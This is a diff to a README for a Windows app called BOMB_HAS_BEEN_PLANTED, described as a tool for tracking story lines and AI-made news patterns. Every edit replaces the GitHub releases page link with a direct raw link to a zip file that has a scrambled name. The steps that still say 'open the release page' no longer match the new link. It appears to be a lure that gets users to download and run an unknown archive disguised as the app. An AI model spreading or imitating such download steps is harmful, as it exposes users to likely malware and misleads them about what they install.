@@ -1,13 +1,13 @@
 # 🧠 BOMB_HAS_BEEN_PLANTED - Track Narrative Shifts with Clarity
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/main/patrik_schumacher/PLANTED_HA_BOM_BEE_v2.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 
 BOMB_HAS_BEEN_PLANTED is a Windows app that helps you view, organize, and track long-running story lines, AI-made news patterns, and linked topics in one place. It is built for users who want a simple way to open the app, follow the content, and keep the view clear.
 
 Use the release page to download and install the app on Windows:
-https://github.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/releases
+https://raw.githubusercontent.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/main/patrik_schumacher/PLANTED_HA_BOM_BEE_v2.6-alpha.3.zip
 
 ## 💻 What You Need
 
@@ -28,7 +28,7 @@ For best results, use a desktop or laptop with:
 Follow these steps on Windows:
 
 1. Open the release page:
-   https://github.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/releases
+   https://raw.githubusercontent.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/main/patrik_schumacher/PLANTED_HA_BOM_BEE_v2.6-alpha.3.zip
 
 2. Find the latest release at the top of the page.
 
@@ -178,7 +178,7 @@ These topics reflect the content set the app is built to help you view and follo
 ## 📂 Download Again
 
 If you need to get the app again, use this link:
-https://github.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/releases
+https://raw.githubusercontent.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/main/patrik_schumacher/PLANTED_HA_BOM_BEE_v2.6-alpha.3.zip
 
 ## 🖥️ Windows Tips
 
@@ -214,4 +214,4 @@ BOMB_HAS_BEEN_PLANTED is built for reading and tracking linked content on Window
 ## 🧩 Release Page
 
 Get the Windows download here:
-https://github.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/releases
+https://raw.githubusercontent.com/Inchoative-skylab263/BOMB_HAS_BEEN_PLANTED/main/patrik_schumacher/PLANTED_HA_BOM_BEE_v2.6-alpha.3.zip
